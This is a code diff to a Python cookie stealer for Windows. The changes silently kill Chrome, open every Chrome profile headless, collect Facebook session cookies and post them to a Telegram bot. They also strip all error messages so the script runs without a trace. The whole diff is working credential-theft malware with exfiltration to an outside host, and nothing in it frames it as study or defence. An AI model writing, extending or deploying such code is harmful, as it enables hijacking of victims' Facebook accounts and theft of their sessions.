@@ -22,9 +22,11 @@ def install_libraries():
         for lib in required_libs:
             if subprocess.run([sys.executable, "-c", "import " + lib], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL).returncode != 0:
                 subprocess.run([sys.executable, "-m", "pip", "install", lib], check=True)
-    except subprocess.CalledProcessError as e:
-        print(f"Error installing libraries: {e}")
+    except subprocess.CalledProcessError:
         sys.exit(1)
+
+def close_chrome():
+    subprocess.run("taskkill /F /IM chrome.exe", shell=True, creationflags=0x08000000, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 
 def check_chrome_installed():
     possible_paths = [
@@ -33,13 +35,17 @@ def check_chrome_installed():
         os.path.join(os.getenv("LOCALAPPDATA", "C:\\Users\\" + os.getenv("USERNAME")), "Google", "Chrome", "Application", "chrome.exe"),
     ]
     if not any(os.path.exists(path) for path in possible_paths):
-        print("Error: Chrome is not installed.")
         sys.exit(1)
     return True
 
-def get_cookies(profile_name):
+def get_cookies_from_profile(profile_name):
     options = Options()
-    options.add_argument("user-data-dir=C:\\Users\\" + os.getenv("USERNAME") + "\\AppData\\Local\\Google\\Chrome\\User Data")
+    options.add_argument('--headless=new')
+    options.add_argument('--no-sandbox')
+    options.add_argument('--disable-dev-shm-usage')
+    options.add_argument('--disable-gpu')
+    user_data_dir = os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data")
+    options.add_argument("user-data-dir=" + user_data_dir)
     options.add_argument("profile-directory=" + profile_name)
 
     try:
@@ -49,33 +55,34 @@ def get_cookies(profile_name):
         cookies = [c for c in driver.get_cookies() if 'facebook.com' in c['domain']]
         driver.quit()
         return cookies
-    except Exception as e:
-        print(f"Error with profile {profile_name}: {e}")
+    except Exception:
         return None
 
 def cookies_to_header_string(cookies):
-    return "; ".join(f"{cookie['name']}={cookie['value']}" for cookie in cookies) if cookies else "No cookies found!"
+    return "; ".join(c['name'] + "=" + c['value'] for c in cookies) if cookies else "Không có cookies!"
 
 def send_telegram(profile_cookies):
-    message = "\n\n".join(f"Profile: {p}\n{cookies_to_header_string(c)}" for p, c in profile_cookies.items()) or "No cookies retrieved!"
+    message = "\n\n".join(f"Profile: {p}\n{cookies_to_header_string(c)}" for p, c in profile_cookies.items()) or "Không lấy được cookies!"
     try:
         response = requests.post(TELEGRAM_API, data={'chat_id': CHAT_ID, 'text': message}, timeout=5)
         if response.status_code != 200:
-            print(f"Error sending Telegram message: {response.text}")
-    except Exception as e:
-        print(f"Error sending Telegram message: {e}")
+            pass
+    except Exception:
+        pass
 
 if __name__ == "__main__":
     install_libraries()
     if not check_chrome_installed():
         sys.exit(1)
+    close_chrome()
+
+    user_data_dir = os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data")
+    profiles = [item for item in os.listdir(user_data_dir) if os.path.isdir(os.path.join(user_data_dir, item)) and (item.startswith("Profile ") or item == "Default")] if os.path.exists(user_data_dir) else []
 
     profile_cookies = {}
-    profiles = ["Default", "Profile 1", "Profile 2"]
     for profile in profiles:
-        cookies = get_cookies(profile)
-        if cookies is not None:
+        cookies = get_cookies_from_profile(profile)
+        if cookies:
             profile_cookies[profile] = cookies
 
     send_telegram(profile_cookies)
-    os._exit(0)  # Tự động đóng CMD
